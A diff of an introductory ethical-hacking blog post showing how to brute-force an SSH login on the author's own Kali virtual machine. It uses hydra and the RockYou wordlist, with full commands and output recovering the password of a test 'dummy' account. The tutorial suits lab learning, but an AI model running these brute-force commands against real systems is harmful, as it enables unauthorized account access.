@@ -23,57 +23,67 @@ Follow the [official website][1] to install the Kali Linux.
 
 ## SSH Brute-Force Dictionary Attack
 
-Instead of trying manually one password after another, let's automate that
-process. We will create a list of possible passwords and pass that list to a
-smart program that will try all those passwords for us.
+Brute-force attach is the kind of attach where the attacker tries all possible values to crack for
+example some password. In this introduction we will create a Linux user account that we will try to
+hack.
+
+Instead of trying manually one password after another, let's automate that process. We will create a
+list of possible passwords and pass that list to a smart program that will try all those passwords
+for us.
 
 On Kali Linux there is a program called `hydra`. Kali Linux also comes with a
-list of possible passwords - RockYou list [2] (comes from the incident in 2009).
+list of possible passwords - [RockYou list][2] (comes from the incident in 2009).
 The file is located in `/usr/share/wordlists/rockyou.txt.gz` and contains 14
 million records. We will use this list to crack a Linux user account.
 
 First of all unzip the file with passwords (also called a dictionary).
 
-`gunzip /usr/share/wordlists/rockyou.txt.gz`
+`sudo gunzip /usr/share/wordlists/rockyou.txt.gz`
 
 > You can try to find your passwords in the list using `grep`. If you find some
 > of them there, then it would be the best to change those immediately.
 
 Now let's use the `hydra` to crack the password. For testing purposes I have
-created on my Raspberry Pi 3 new account `dummy` with password `winniethepooh`.
+created a new account `dummy` with password `winniethepooh` in my Kali virtual machine.
 
-`useradd dummy`
+```bash
+sudo useradd --no-create-home --no-user-group dummy`
+sudo passwd dummy
+````
+
+You will also need to enable SSH to allow incoming connections
+
+`sudo service ssh start`
 
 Next, run the `hydra` to crack the password. This time we are not going to crack
 the username, instead we will pass the username to `hydra` manually to simplify
 and speed up the process.
 
-`sudo hydra -l "dummy" -P /usr/share/wordlists/rockyou.txt <ip_address> ssh`
+`hydra -l "dummy" -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1`
 
-This might take a while, because Linux is trying to slow potentional attacker
+This might take a while, because Linux is trying to slow potential attacker
 down by adding extra timeout when logging in over SSH. After couple moments you
 get the first output with statistics:
 
 ```bash
 ┌──(kali㉿kali)-[~/Desktop]
-└─$ sudo hydra -l "dummy" -P /usr/share/wordlists/rockyou.txt pi3 ssh
-Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in
-military or secret service organizations, or for illegal purposes (this is
-non-binding, these *** ignore laws and ethics anyway).
+└─$ hydra -l dummy -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret
+service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and
+ethics anyway).
 
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-04-03
-13:34:08
-[WARNING] Many SSH configurations limit the number of parallel tasks, it is
-recommended to reduce the tasks: use -t 4
-[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries
-(l:1/p:14344399), ~896525 tries per task
-[DATA] attacking ssh://pi3:22/
-[STATUS] 147.00 tries/min, 147 tries in 00:01h, 14344255 to do in 1626:20h, 16
-active
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-26 12:54:03
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce
+the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525
+tries per task
+[DATA] attacking ssh://127.0.0.1:22/
+[STATUS] 114.00 tries/min, 114 tries in 00:01h, 14344286 to do in 2097:08h, 15 active
+^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
 ```
 
-You can notice in the printout that the current speed is 147 passwords per
-minute and the time to finish is 1626 hours (68 days), therefore it might be
+You can notice in the printout that the current speed is 114 passwords per
+minute and the time to finish is 2097 hours (87 days), therefore it might be
 better to use smaller dictionary for testing purposes.
 
 I have reduced the dictionary size to 200 records (but included the
@@ -81,30 +91,36 @@ I have reduced the dictionary size to 200 records (but included the
 
 ```bash
 cat /usr/share/wordlists/rockyou.txt | \
-head -n 100000 | \
-sort --random-sort | \
-head -n 200 | \
-sed '1s/.*/winniethepooh/' | \
-sort --random-sort > ~/wordlist.txt`
+  head -n 100000 | \
+  sort --random-sort  | \
+  head -n 200 | \
+  sed '1s/.*/winniethepooh/' | \
+  sort --random-sort > ~/word_list.txt
 ```
 
 Now it is possible to run `hydra` again with the smaller wordlist. After two
 minutes at latest we should crack the password.
 
-`sudo hydra -l "dummy" -P ~/wordlist.txt <ip_address> ssh`
+`hydra -l dummy -P ~/word_list.txt ssh://127.0.0.1`
 
 After a moment we got the result with correct password.
 
 ```bash
-[DATA] max 16 tasks per 1 server, overall 16 tasks, 200 login tries (l:1/p:200),
-~13 tries per task
-[DATA] attacking ssh://pi3:22/
-[STATUS] 97.00 tries/min, 97 tries in 00:01h, 104 to do in 00:02h, 16 active
-[22][ssh] host: pi3   login: dummy   password: winniethepooh
+┌──(kali㉿kali)-[~/Desktop]
+└─$ hydra -l dummy -P ~/word_list.txt ssh://127.0.0.1 
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-26 13:03:59
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 200 login tries (l:1/p:200), ~13 tries per task
+[DATA] attacking ssh://127.0.0.1:22/
+[22][ssh] host: 127.0.0.1   login: dummy   password: winniethepooh
 1 of 1 target successfully completed, 1 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-04-03
-14:02:29
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-26 13:05:02
 ```
+
+Hydra was able to crack the password of the user account: `winniethepooh`.
 
 This was the first introductory blog post about ethical hacking. Thanks for
 reading!
